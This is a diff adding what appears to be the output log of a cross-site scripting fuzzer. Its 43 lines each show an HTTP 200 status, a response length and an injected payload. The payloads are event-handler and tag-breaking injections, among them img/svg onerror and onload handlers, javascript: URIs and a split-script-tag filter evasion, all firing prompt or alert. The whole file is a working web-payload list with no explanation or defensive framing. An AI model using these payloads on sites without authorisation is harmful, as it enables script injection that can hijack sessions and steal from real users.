@@ -1,0 +1,43 @@
+status code :   200   lenght :   4246   payload :   "-prompt(8)-"
+status code :   200   lenght :   4249   payload :   ";a=prompt,a()//
+status code :   200   lenght :   4249   payload :   ';a=prompt,a()//
+status code :   200   lenght :   4257   payload :   "onclick=prompt(8)>"@x.y
+status code :   200   lenght :   4279   payload :   "onclick=prompt(8)><svg/onload=prompt(8)>"@x.y
+status code :   200   lenght :   4262   payload :   <image/src/onerror=prompt(8)>
+status code :   200   lenght :   4260   payload :   <img/src/onerror=prompt(8)>
+status code :   200   lenght :   4262   payload :   <image src/onerror=prompt(8)>
+status code :   200   lenght :   4260   payload :   <img src/onerror=prompt(8)>
+status code :   200   lenght :   4265   payload :   <image src =q onerror=prompt(8)>
+status code :   200   lenght :   4263   payload :   <img src =q onerror=prompt(8)>
+status code :   200   lenght :   4281   payload :   </scrip</script>t><img src =q onerror=prompt(8)>
+status code :   200   lenght :   4287   payload :   <img src=1 href=1 onerror="javascript:alert(1)"></img>
+status code :   200   lenght :   4291   payload :   <audio src=1 href=1 onerror="javascript:alert(1)"></audio>
+status code :   200   lenght :   4291   payload :   <video src=1 href=1 onerror="javascript:alert(1)"></video>
+status code :   200   lenght :   4289   payload :   <body src=1 href=1 onerror="javascript:alert(1)"></body>
+status code :   200   lenght :   4291   payload :   <image src=1 href=1 onerror="javascript:alert(1)"></image>
+status code :   200   lenght :   4293   payload :   <object src=1 href=1 onerror="javascript:alert(1)"></object>
+status code :   200   lenght :   4293   payload :   <script src=1 href=1 onerror="javascript:alert(1)"></script>
+status code :   200   lenght :   4308   payload :   <svg onResize svg onResize="javascript:javascript:alert(1)"></svg onResize>
+status code :   200   lenght :   4338   payload :   <title onPropertyChange title onPropertyChange="javascript:javascript:alert(1)"></title onPropertyChange>
+status code :   200   lenght :   4311   payload :   <iframe onLoad iframe onLoad="javascript:javascript:alert(1)"></iframe onLoad>
+status code :   200   lenght :   4323   payload :   <body onMouseEnter body onMouseEnter="javascript:javascript:alert(1)"></body onMouseEnter>
+status code :   200   lenght :   4308   payload :   <body onFocus body onFocus="javascript:javascript:alert(1)"></body onFocus>
+status code :   200   lenght :   4323   payload :   <frameset onScroll frameset onScroll="javascript:javascript:alert(1)"></frameset onScroll>
+status code :   200   lenght :   4347   payload :   <script onReadyStateChange script onReadyStateChange="javascript:javascript:alert(1)"></script onReadyStateChange>
+status code :   200   lenght :   4314   payload :   <html onMouseUp html onMouseUp="javascript:javascript:alert(1)"></html onMouseUp>
+status code :   200   lenght :   4335   payload :   <body onPropertyChange body onPropertyChange="javascript:javascript:alert(1)"></body onPropertyChange>
+status code :   200   lenght :   4302   payload :   <svg onLoad svg onLoad="javascript:javascript:alert(1)"></svg onLoad>
+status code :   200   lenght :   4317   payload :   <body onPageHide body onPageHide="javascript:javascript:alert(1)"></body onPageHide>
+status code :   200   lenght :   4320   payload :   <body onMouseOver body onMouseOver="javascript:javascript:alert(1)"></body onMouseOver>
+status code :   200   lenght :   4311   payload :   <body onUnload body onUnload="javascript:javascript:alert(1)"></body onUnload>
+status code :   200   lenght :   4305   payload :   <body onLoad body onLoad="javascript:javascript:alert(1)"></body onLoad>
+status code :   200   lenght :   4344   payload :   <bgsound onPropertyChange bgsound onPropertyChange="javascript:javascript:alert(1)"></bgsound onPropertyChange>
+status code :   200   lenght :   4323   payload :   <html onMouseLeave html onMouseLeave="javascript:javascript:alert(1)"></html onMouseLeave>
+status code :   200   lenght :   4323   payload :   <html onMouseWheel html onMouseWheel="javascript:javascript:alert(1)"></html onMouseWheel>
+status code :   200   lenght :   4308   payload :   <style onLoad style onLoad="javascript:javascript:alert(1)"></style onLoad>
+status code :   200   lenght :   4347   payload :   <iframe onReadyStateChange iframe onReadyStateChange="javascript:javascript:alert(1)"></iframe onReadyStateChange>
+status code :   200   lenght :   4317   payload :   <body onPageShow body onPageShow="javascript:javascript:alert(1)"></body onPageShow>
+status code :   200   lenght :   4344   payload :   <style onReadyStateChange style onReadyStateChange="javascript:javascript:alert(1)"></style onReadyStateChange>
+status code :   200   lenght :   4320   payload :   <frameset onFocus frameset onFocus="javascript:javascript:alert(1)"></frameset onFocus>
+status code :   200   lenght :   4314   payload :   <applet onError applet onError="javascript:javascript:alert(1)"></applet onError>
+status code :   200   lenght :   4309   payload :   <marquee onStart marquee onStart="javascript:javascript:alert(1)"></marquee>
